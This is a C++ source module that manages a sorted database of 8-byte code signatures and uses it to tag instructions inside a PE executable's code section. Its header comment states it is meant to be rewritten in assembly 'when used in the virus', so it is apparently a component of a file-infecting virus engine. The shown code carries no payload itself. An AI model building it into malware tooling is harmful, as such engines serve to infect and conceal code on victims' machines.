
////////x///////x///////x///////x///////x///////x///////x///////x///////x////

// SIGnature MANager
// should be completely rewritten in asm, when used in the virus

#define MAX_SIG_SIZE    (4*1024*1024)   // 4M, max size of signature database

#define C_SIGSIZE       8               // # of bytes per signature

#define sigfile         "mistfall.sig"

#define SIG_SORTED                      // sorted signatures

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

#include "debug.hpp"

BYTE* sigptr = NULL;
DWORD sigsize, sigsize0;

int is_sig(BYTE* x)
{
#ifdef SIG_SORTED

  if (sigsize==0) return 0;
  DWORD a=0, b=sigsize-C_SIGSIZE;
  int va = memcmp(x, &sigptr[a], C_SIGSIZE);
  if (va<0) return 0;
  if (va==0) return 1;
  int vb = memcmp(x, &sigptr[b], C_SIGSIZE);
  if (vb>0) return 0;
  if (vb==0) return 1;
  for (;;)
  {
    DWORD c = (((a/C_SIGSIZE) + (b/C_SIGSIZE)) / 2) * C_SIGSIZE;
    int vc = memcmp(x, &sigptr[c], C_SIGSIZE);
    if (vc == 0) return 1;
    if ((c == a) || (c == b)) return 0;
    if (vc < 0) b = c;
    if (vc > 0) a = c;
  }

#else // !SIG_SORTED

  for (DWORD j=0; j<sigsize; j+=C_SIGSIZE)
  {
    if (*(DWORD*)x == *(DWORD*)&sigptr[j])
    if (memcmp(x, &sigptr[j], C_SIGSIZE) == 0)
      return 1;
  }
  return 0;

#endif // SIG_SORTED
}

void insert_sig(BYTE* x, DWORD o)
{
  if (o<sigsize)
    memmove(&sigptr[o+C_SIGSIZE], &sigptr[o], sigsize-o);
  memcpy(&sigptr[o], x, C_SIGSIZE);
  sigsize += C_SIGSIZE;
}

void add_sig(BYTE* x)
{
#ifdef SIG_SORTED

//printf("add: %02X %02X %02X\n",x[0],x[1],x[2]);

  if (sigsize==0)
  {
    insert_sig(x,0);
    return;
  }

  DWORD a=0, b=sigsize-C_SIGSIZE;
  int va = memcmp(x, &sigptr[a], C_SIGSIZE);
  if (va < 0)
  {
    insert_sig(x, a);
    return;
  }
  int vb = memcmp(x, &sigptr[b], C_SIGSIZE);
  if (vb > 0)
  {
    insert_sig(x, b+C_SIGSIZE);
    return;
  }
  for (;;)
  {
    DWORD c = (((a/C_SIGSIZE) + (b/C_SIGSIZE)) / 2) * C_SIGSIZE;
    if ((c == a) || (c == b))
    {
      insert_sig(x, b);
      return;
    }
    int vc = memcmp(x, &sigptr[c], C_SIGSIZE);
    if (vc < 0) b = c;
    if (vc > 0) a = c;
  }

#else // !SIG_SORTED

  memcpy(&sigptr[sigsize], x, C_SIGSIZE);
  sigsize += C_SIGSIZE;

#endif // SIG_SORTED
}

void sig_load()
{
  if (sigptr != NULL) return;

#ifdef DUMP_MSG
  printf("- loading signature table\n");
#endif

  FILE*f=fopen(sigfile,"rb");
  sigsize0 = sigsize = f == NULL ? 0 : filelength(fileno(f));
  sigptr = (BYTE*) calloc(1,MAX_SIG_SIZE);
  if (f)
  {
    fread(sigptr, 1,sigsize, f);
    fclose(f);
  }

} //sig_load

void sig_save()
{
  if (sigsize == sigsize0) return;
  sigsize0 = sigsize;

#ifdef DUMP_MSG
  printf("- writing signature table\n");
#endif

  FILE*f=fopen(sigfile,"wb");
  assert(f);
  fwrite(sigptr, 1,sigsize, f);
  fclose(f);

} //sig_save

// returns: (when action==0)
//     0      --if success
//  non-zero  --if error

int __cdecl my_sigman(
            DWORD           user_arg,
            PE_HEADER*      pe,
            PE_OBJENTRY*    oe,
            BYTE*           memb,
            DWORD*          flag,
            DWORD           action              // 0==before, 1==after
            )
{

  if (action==0)
  {
    sig_load();

#ifdef DUMP_MSG
    printf("- analyzing signatures\n");
#endif

    int count=0;
    for (DWORD i=oe[0].oe_virtrva;
         i < oe[0].oe_virtrva + oe[0].oe_physsize;
         i++)
    {
      if (is_sig(&memb[i]))
      {
        flag[i] |= FL_SIGNATURE | FL_NEXT;
        count++;
      }
    }//for i
#ifdef DUMP_MSG
    printf("- applied signatures: %i\n", count);
#endif
  }

  if (action==1)
  {
#ifdef DUMP_MSG
    printf("- analyzing new signatures\n");
#endif

    int count=0;
    if (sigsize+C_SIGSIZE <= MAX_SIG_SIZE)
    for (DWORD i=oe[0].oe_virtrva;
         i < oe[0].oe_virtrva + oe[0].oe_physsize;
         i++)
    if (flag[i] & FL_LABEL)
    if (flag[i] & (FL_CREF|FL_DREF))
    if (flag[i] & FL_OPCODE)
    if (memb[i+C_SIGSIZE-1] != memb[i+C_SIGSIZE-2])
    {
      for (DWORD j=0; j<C_SIGSIZE; j++)
        if (flag[i+j] & (FL_HAVEREL|FL_STOP|FL_DATA|FL_FIXUP|FL_RVA))
          goto c1;
      if (!is_sig(&memb[i]))
      {
        add_sig(&memb[i]);
        count++;
        if (sigsize+C_SIGSIZE > MAX_SIG_SIZE) break;
      }
c1:
    }
#ifdef DUMP_MSG
    printf("- new signatures: %i\n", count);
#endif

    sig_save();
  }

  DWORD t = (DWORD)user_arg+(DWORD)pe+(DWORD)oe+(DWORD)memb+
            (DWORD)flag+(DWORD)action;
  t *= 0;

  return t;             // 0==success
} //sigman

#include "debug.hpp"
